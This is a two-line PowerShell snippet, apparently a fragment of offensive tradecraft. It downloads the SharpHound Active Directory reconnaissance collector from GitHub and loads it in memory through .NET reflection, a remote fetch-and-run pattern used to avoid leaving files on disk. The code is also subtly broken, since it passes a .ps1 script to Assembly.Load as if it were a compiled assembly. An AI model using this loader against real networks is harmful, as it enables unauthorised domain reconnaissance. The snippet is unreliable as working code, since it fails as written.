$data=(new-object System.Net.WebClient).DownloadData(‘https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/SharpHound.ps1’)
$assembly=[System.Reflection.Assembly]::Load($data)
